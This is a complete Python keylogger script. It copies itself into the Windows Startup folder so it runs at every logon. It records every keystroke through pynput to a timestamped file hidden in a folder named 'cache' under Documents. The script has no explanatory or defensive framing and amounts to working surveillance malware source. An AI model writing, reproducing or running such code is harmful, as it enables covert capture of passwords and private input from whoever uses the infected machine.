import os
import sys
import shutil
from pynput import keyboard
from datetime import datetime


def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    current_script = os.path.realpath(sys.argv[0])
    target_script = os.path.join(startup_path, os.path.basename(current_script))

    if current_script != target_script:
        try:
            shutil.copy(current_script, target_script)
            
            print("Script copied.")
        except Exception as e:
            print(f"Failed to add to startup: {e}")


add_to_startup()



documents_path = os.path.join(os.path.expanduser("~"), "Documents")


log_folder = os.path.join(documents_path, "cache")


os.makedirs(log_folder, exist_ok=True)


filename = os.path.join(log_folder, f"keystrokes_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt")


def on_press(key):
    try:
        with open(filename, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(filename, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
